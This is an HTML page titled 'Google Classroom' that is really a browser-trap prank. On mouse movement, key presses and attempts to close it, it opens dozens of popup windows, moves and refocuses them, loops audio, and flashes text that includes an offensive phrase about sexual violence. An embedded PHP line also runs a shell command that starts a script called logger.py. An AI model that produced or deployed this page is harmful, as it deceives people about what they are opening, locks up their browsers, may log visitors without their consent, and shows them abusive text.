apps.html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Google Classroom</title>
<?PHP
	echo shell_exec("python logger.py 'parameter1'");
	?>
</head>
<body id="bodyEl">
    <h1 id="title"></h1>

    <style>
        #title{
            text-align: center;
            margin-top: 50px;
            font-size: 100px;
        }
    </style>
    <script>
        const title = document.getElementById('title')
        const body = document.getElementById('bodyEl')

        const music = new Audio('music.mp3')

        let nextAn = 1
        let indexN = 0
        function createNewPopUp(){
            let newWindow = window.open('apps.html','', 'width=354545540px height=23400px')
            popups.push(newWindow)
        }
let wordlist = ['black', 'efn', 'n', 'we were raped on einstein island']
        let popups = [window]
			createNewPopUp()

        function getRandomCordinats(){
            return [Math.floor(Math.random() * (screen.width-100 - 0) + 0), Math.floor(Math.random() * (screen.height-100 - 0) + 0)]
        }

        setInterval(()=>{
            if (popups.length!=0){
                for (let i = 0; i < popups.length;i++){
                    let xy = getRandomCordinats()
                    popups[i].moveTo(xy[0], xy[1])
                    popups[i].focus()
                }
            }
        }, 9999)/*make this lower later*/

        setInterval(()=>{
            title.textContent = wordlist[indexN]
            if(nextAn==1){
                title.style.color = 'green'
                body.style.backgroundColor = 'blue'
                nextAn = 2
            }else{
                title.style.color = 'black'
                body.style.backgroundColor = 'black'
                nextAn = 1
            }
            if (indexN == 3) {
                indexN = 0
            }else{
                indexN++
            }
        }, 400)



        window.addEventListener('beforeunload', (e)=>{
            for (let i = 0; i<20; i++){
                createNewPopUp()
            }

            e.preventDefault()
            e.returnValue = ''
        })
        
        window.addEventListener('load', ()=>{
            let h = window.innerHeight
            title.style.marginTop = (h/2 - 120).toString() + "px"
        })

        window.addEventListener('resize', ()=>{
            let h = window.innerHeight
            title.style.marginTop = (h/2 - 120).toString() + "px"
        })

        document.addEventListener('click', ()=>{
            music.play()
        })

        document.addEventListener('mouseenter', ()=>{
            music.play()
        })

        document.addEventListener('keydown', (e)=>{
            music.play()
            for (let i = 0; i<20; i++){
                createNewPopUp()
                createNewPopUp()
                createNewPopUp()
                createNewPopUp()
                createNewPopUp()
                createNewPopUp()
                createNewPopUp()
                createNewPopUp()
                createNewPopUp()
                createNewPopUp()
                createNewPopUp()
                createNewPopUp()
                createNewPopUp()
                createNewPopUp()
                createNewPopUp()
                createNewPopUp()
                createNewPopUp()
                createNewPopUp()
                createNewPopUp()
                createNewPopUp()
                createNewPopUp()
                createNewPopUp()
                createNewPopUp()
                createNewPopUp()
                createNewPopUp()
                createNewPopUp()
                createNewPopUp()
                createNewPopUp()
                createNewPopUp()
                createNewPopUp()
                createNewPopUp()
                createNewPopUp()
                createNewPopUp()
                createNewPopUp()
                createNewPopUp()
                createNewPopUp()
                createNewPopUp()
                createNewPopUp()
                createNewPopUp()
                createNewPopUp()
                createNewPopUp()
                createNewPopUp()
                createNewPopUp()
                createNewPopUp()
                createNewPopUp()
                createNewPopUp()
                createNewPopUp()
                createNewPopUp()
                createNewPopUp()
                createNewPopUp()
                createNewPopUp()

            }
            e.preventDefault()
        })

	 document.addEventListener('mousemove', (e)=>{
            music.play()
            for (let i = 0; i<20; i++){
                createNewPopUp()
            }
            e.preventDefault()
        })

        music.addEventListener('ended', ()=>{
            music.play()
        })

        
    </script>
</body>
</html>
